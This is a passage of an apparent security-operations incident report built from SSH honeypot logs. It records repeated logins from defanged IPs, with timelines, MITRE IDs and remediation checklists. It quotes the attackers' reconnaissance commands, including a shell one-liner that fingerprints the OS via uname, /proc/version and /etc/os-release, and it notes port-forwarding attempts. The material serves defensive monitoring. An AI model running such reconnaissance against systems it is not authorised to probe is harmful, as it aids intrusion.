| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:20:15` | `cowrie.session.connect` |
| `2026-09-12 14:20:15` | `cowrie.client.version` |
| `2026-09-12 14:20:15` | `cowrie.client.kex` |
| `2026-09-12 14:20:16` | `cowrie.login.success` |
| `2026-09-12 14:20:17` | `cowrie.session.params` |
| `2026-09-12 14:20:17` | `cowrie.command.input` |
| `2026-09-12 14:20:17` | `cowrie.log.closed` |
| `2026-09-12 14:20:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c5d18e0b99f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:21 |
| **Last Seen** | 2026-09-12 14:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:21:53` | `cowrie.session.connect` |
| `2026-09-12 14:21:53` | `cowrie.client.version` |
| `2026-09-12 14:21:53` | `cowrie.client.kex` |
| `2026-09-12 14:21:54` | `cowrie.login.success` |
| `2026-09-12 14:21:54` | `cowrie.session.params` |
| `2026-09-12 14:21:54` | `cowrie.command.input` |
| `2026-09-12 14:21:54` | `cowrie.log.closed` |
| `2026-09-12 14:21:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eecf866679bd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:23 |
| **Last Seen** | 2026-09-12 14:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:23:35` | `cowrie.session.connect` |
| `2026-09-12 14:23:35` | `cowrie.client.version` |
| `2026-09-12 14:23:35` | `cowrie.client.kex` |
| `2026-09-12 14:23:35` | `cowrie.login.success` |
| `2026-09-12 14:23:36` | `cowrie.session.params` |
| `2026-09-12 14:23:36` | `cowrie.command.input` |
| `2026-09-12 14:23:36` | `cowrie.log.closed` |
| `2026-09-12 14:23:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6703d39baa43

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:25 |
| **Last Seen** | 2026-09-12 14:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:25:16` | `cowrie.session.connect` |
| `2026-09-12 14:25:16` | `cowrie.client.version` |
| `2026-09-12 14:25:16` | `cowrie.client.kex` |
| `2026-09-12 14:25:17` | `cowrie.login.success` |
| `2026-09-12 14:25:17` | `cowrie.session.params` |
| `2026-09-12 14:25:17` | `cowrie.command.input` |
| `2026-09-12 14:25:17` | `cowrie.log.closed` |
| `2026-09-12 14:25:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dedfa6c264b6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:26 |
| **Last Seen** | 2026-09-12 14:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:26:55` | `cowrie.session.connect` |
| `2026-09-12 14:26:55` | `cowrie.client.version` |
| `2026-09-12 14:26:55` | `cowrie.client.kex` |
| `2026-09-12 14:26:56` | `cowrie.login.success` |
| `2026-09-12 14:26:56` | `cowrie.session.params` |
| `2026-09-12 14:26:56` | `cowrie.command.input` |
| `2026-09-12 14:26:56` | `cowrie.log.closed` |
| `2026-09-12 14:26:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71c63c6079f3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:28 |
| **Last Seen** | 2026-09-12 14:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:28:35` | `cowrie.session.connect` |
| `2026-09-12 14:28:35` | `cowrie.client.version` |
| `2026-09-12 14:28:35` | `cowrie.client.kex` |
| `2026-09-12 14:28:36` | `cowrie.login.success` |
| `2026-09-12 14:28:37` | `cowrie.session.params` |
| `2026-09-12 14:28:37` | `cowrie.command.input` |
| `2026-09-12 14:28:37` | `cowrie.log.closed` |
| `2026-09-12 14:28:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdf41a044e99

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:30 |
| **Last Seen** | 2026-09-12 14:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:30:20` | `cowrie.session.connect` |
| `2026-09-12 14:30:20` | `cowrie.client.version` |
| `2026-09-12 14:30:20` | `cowrie.client.kex` |
| `2026-09-12 14:30:21` | `cowrie.login.success` |
| `2026-09-12 14:30:21` | `cowrie.session.params` |
| `2026-09-12 14:30:21` | `cowrie.command.input` |
| `2026-09-12 14:30:21` | `cowrie.log.closed` |
| `2026-09-12 14:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d18a7b0ce29

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:32 |
| **Last Seen** | 2026-09-12 14:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:32:03` | `cowrie.session.connect` |
| `2026-09-12 14:32:03` | `cowrie.client.version` |
| `2026-09-12 14:32:03` | `cowrie.client.kex` |
| `2026-09-12 14:32:04` | `cowrie.login.success` |
| `2026-09-12 14:32:05` | `cowrie.session.params` |
| `2026-09-12 14:32:05` | `cowrie.command.input` |
| `2026-09-12 14:32:05` | `cowrie.log.closed` |
| `2026-09-12 14:32:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45d0744dae87

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-12 14:32 |
| **Last Seen** | 2026-09-12 14:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:32:46` | `cowrie.session.connect` |
| `2026-09-12 14:32:46` | `cowrie.client.version` |
| `2026-09-12 14:32:46` | `cowrie.client.kex` |
| `2026-09-12 14:32:49` | `cowrie.login.success` |
| `2026-09-12 14:32:51` | `cowrie.session.params` |
| `2026-09-12 14:32:51` | `cowrie.command.input` |
| `2026-09-12 14:32:51` | `cowrie.command.input` |
| `2026-09-12 14:32:51` | `cowrie.command.input` |
| `2026-09-12 14:32:51` | `cowrie.command.input` |
| `2026-09-12 14:32:51` | `cowrie.command.input` |
| `2026-09-12 14:32:51` | `cowrie.command.success` |
| `2026-09-12 14:32:51` | `cowrie.command.input` |
| `2026-09-12 14:32:51` | `cowrie.command.input` |
| `2026-09-12 14:32:51` | `cowrie.command.input` |
| `2026-09-12 14:32:51` | `cowrie.command.input` |
| `2026-09-12 14:32:52` | `cowrie.log.closed` |
| `2026-09-12 14:32:54` | `cowrie.session.params` |
| `2026-09-12 14:32:54` | `cowrie.command.input` |
| `2026-09-12 14:32:54` | `cowrie.log.closed` |
| `2026-09-12 14:32:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-385921a99777

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-09-12 14:33 |
| **Last Seen** | 2026-09-12 14:33 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:33:19` | `cowrie.session.connect` |
| `2026-09-12 14:33:19` | `cowrie.client.version` |
| `2026-09-12 14:33:20` | `cowrie.client.kex` |
| `2026-09-12 14:33:20` | `cowrie.login.success` |
| `2026-09-12 14:33:25` | `cowrie.direct-tcpip.request` |
| `2026-09-12 14:33:26` | `cowrie.direct-tcpip.ja4` |
| `2026-09-12 14:33:26` | `cowrie.direct-tcpip.data` |
| `2026-09-12 14:33:26` | `cowrie.direct-tcpip.request` |
| `2026-09-12 14:33:29` | `cowrie.direct-tcpip.ja4` |
| `2026-09-12 14:33:29` | `cowrie.direct-tcpip.data` |
| `2026-09-12 14:33:30` | `cowrie.direct-tcpip.request` |
| `2026-09-12 14:33:32` | `cowrie.direct-tcpip.ja4` |
| `2026-09-12 14:33:32` | `cowrie.direct-tcpip.data` |
| `2026-09-12 14:33:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09d107244fd4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:33 |
| **Last Seen** | 2026-09-12 14:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:33:43` | `cowrie.session.connect` |
| `2026-09-12 14:33:43` | `cowrie.client.version` |
| `2026-09-12 14:33:43` | `cowrie.client.kex` |
| `2026-09-12 14:33:43` | `cowrie.login.success` |
| `2026-09-12 14:33:44` | `cowrie.session.params` |
| `2026-09-12 14:33:44` | `cowrie.command.input` |
| `2026-09-12 14:33:44` | `cowrie.log.closed` |
| `2026-09-12 14:33:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3e0a9d3dc8a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-12 14:34 |
| **Last Seen** | 2026-09-12 14:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:34:57` | `cowrie.session.connect` |
| `2026-09-12 14:34:58` | `cowrie.client.version` |
| `2026-09-12 14:34:58` | `cowrie.client.kex` |
| `2026-09-12 14:35:00` | `cowrie.login.success` |
| `2026-09-12 14:35:02` | `cowrie.session.params` |
| `2026-09-12 14:35:02` | `cowrie.command.input` |
| `2026-09-12 14:35:02` | `cowrie.command.input` |
| `2026-09-12 14:35:02` | `cowrie.command.input` |
| `2026-09-12 14:35:02` | `cowrie.command.input` |
| `2026-09-12 14:35:02` | `cowrie.command.input` |
| `2026-09-12 14:35:02` | `cowrie.command.success` |
| `2026-09-12 14:35:02` | `cowrie.command.input` |
| `2026-09-12 14:35:02` | `cowrie.command.input` |
| `2026-09-12 14:35:02` | `cowrie.command.input` |
| `2026-09-12 14:35:02` | `cowrie.command.input` |
| `2026-09-12 14:35:03` | `cowrie.log.closed` |
| `2026-09-12 14:35:04` | `cowrie.session.params` |
| `2026-09-12 14:35:04` | `cowrie.command.input` |
| `2026-09-12 14:35:05` | `cowrie.log.closed` |
| `2026-09-12 14:35:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-391e01ffff68

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:35 |
| **Last Seen** | 2026-09-12 14:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:35:22` | `cowrie.session.connect` |
| `2026-09-12 14:35:22` | `cowrie.client.version` |
| `2026-09-12 14:35:22` | `cowrie.client.kex` |
| `2026-09-12 14:35:23` | `cowrie.login.success` |
| `2026-09-12 14:35:23` | `cowrie.session.params` |
| `2026-09-12 14:35:23` | `cowrie.command.input` |
| `2026-09-12 14:35:23` | `cowrie.log.closed` |
| `2026-09-12 14:35:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f26abb165e07

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:37 |
| **Last Seen** | 2026-09-12 14:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:37:04` | `cowrie.session.connect` |
| `2026-09-12 14:37:04` | `cowrie.client.version` |
| `2026-09-12 14:37:05` | `cowrie.client.kex` |
| `2026-09-12 14:37:05` | `cowrie.login.success` |
| `2026-09-12 14:37:06` | `cowrie.session.params` |
| `2026-09-12 14:37:06` | `cowrie.command.input` |
| `2026-09-12 14:37:06` | `cowrie.log.closed` |
| `2026-09-12 14:37:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e6b7bc99052

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-12 14:37 |
| **Last Seen** | 2026-09-12 14:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:37:13` | `cowrie.session.connect` |
| `2026-09-12 14:37:14` | `cowrie.client.version` |
| `2026-09-12 14:37:14` | `cowrie.client.kex` |
| `2026-09-12 14:37:16` | `cowrie.login.success` |
| `2026-09-12 14:37:17` | `cowrie.session.params` |
| `2026-09-12 14:37:17` | `cowrie.command.input` |
| `2026-09-12 14:37:17` | `cowrie.command.input` |
| `2026-09-12 14:37:17` | `cowrie.command.input` |
| `2026-09-12 14:37:17` | `cowrie.command.input` |
| `2026-09-12 14:37:17` | `cowrie.command.input` |
| `2026-09-12 14:37:17` | `cowrie.command.success` |
| `2026-09-12 14:37:17` | `cowrie.command.input` |
| `2026-09-12 14:37:17` | `cowrie.command.input` |
| `2026-09-12 14:37:17` | `cowrie.command.input` |
| `2026-09-12 14:37:17` | `cowrie.command.input` |
| `2026-09-12 14:37:18` | `cowrie.log.closed` |
| `2026-09-12 14:37:20` | `cowrie.session.params` |
| `2026-09-12 14:37:20` | `cowrie.command.input` |
| `2026-09-12 14:37:20` | `cowrie.log.closed` |
| `2026-09-12 14:37:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82eed9cf9713

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:38 |
| **Last Seen** | 2026-09-12 14:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:38:44` | `cowrie.session.connect` |
| `2026-09-12 14:38:44` | `cowrie.client.version` |
| `2026-09-12 14:38:44` | `cowrie.client.kex` |
| `2026-09-12 14:38:45` | `cowrie.login.success` |
| `2026-09-12 14:38:45` | `cowrie.session.params` |
| `2026-09-12 14:38:45` | `cowrie.command.input` |
| `2026-09-12 14:38:45` | `cowrie.log.closed` |
| `2026-09-12 14:38:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a53a4d58e193

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-12 14:39 |
| **Last Seen** | 2026-09-12 14:39 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:39:28` | `cowrie.session.connect` |
| `2026-09-12 14:39:28` | `cowrie.client.version` |
| `2026-09-12 14:39:28` | `cowrie.client.kex` |
| `2026-09-12 14:39:30` | `cowrie.login.success` |
| `2026-09-12 14:39:32` | `cowrie.session.params` |
| `2026-09-12 14:39:32` | `cowrie.command.input` |
| `2026-09-12 14:39:32` | `cowrie.command.input` |
| `2026-09-12 14:39:32` | `cowrie.command.input` |
| `2026-09-12 14:39:32` | `cowrie.command.input` |
| `2026-09-12 14:39:32` | `cowrie.command.input` |
| `2026-09-12 14:39:32` | `cowrie.command.success` |
| `2026-09-12 14:39:32` | `cowrie.command.input` |
| `2026-09-12 14:39:32` | `cowrie.command.input` |
| `2026-09-12 14:39:32` | `cowrie.command.input` |
| `2026-09-12 14:39:32` | `cowrie.command.input` |
| `2026-09-12 14:39:33` | `cowrie.log.closed` |
| `2026-09-12 14:39:34` | `cowrie.session.params` |
| `2026-09-12 14:39:34` | `cowrie.command.input` |
| `2026-09-12 14:39:34` | `cowrie.log.closed` |
| `2026-09-12 14:39:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f8a27ad7b65

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-09-12 14:39 |
| **Last Seen** | 2026-09-12 14:40 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:39:51` | `cowrie.session.connect` |
| `2026-09-12 14:39:51` | `cowrie.client.version` |
| `2026-09-12 14:39:51` | `cowrie.client.kex` |
| `2026-09-12 14:39:52` | `cowrie.login.success` |
| `2026-09-12 14:39:52` | `cowrie.direct-tcpip.request` |
| `2026-09-12 14:39:52` | `cowrie.direct-tcpip.ja4` |
| `2026-09-12 14:39:52` | `cowrie.direct-tcpip.data` |
| `2026-09-12 14:39:54` | `cowrie.direct-tcpip.request` |
| `2026-09-12 14:39:56` | `cowrie.direct-tcpip.ja4` |
| `2026-09-12 14:39:56` | `cowrie.direct-tcpip.data` |
| `2026-09-12 14:40:01` | `cowrie.direct-tcpip.request` |
| `2026-09-12 14:40:03` | `cowrie.direct-tcpip.ja4` |
| `2026-09-12 14:40:03` | `cowrie.direct-tcpip.data` |
| `2026-09-12 14:40:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-380801d8f29b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-09-12 14:40 |
| **Last Seen** | 2026-09-12 14:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-12 14:40:22` | `cowrie.session.connect` |
| `2026-09-12 14:40:22` | `cowrie.client.version` |
| `2026-09-12 14:40:22` | `cowrie.client.kex` |
| `2026-09-12 14:40:22` | `cowrie.login.success` |
| `2026-09-12 14:40:23` | `cowrie.session.params` |
| `2026-09-12 14:40:23` | `cowrie.command.input` |
| `2026-09-12 14:40:23` | `cowrie.log.closed` |
| `2026-09-12 14:40:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-607c30d07eff

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-12 14:41 |
| **Last Seen** | 2026-09-12 14:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
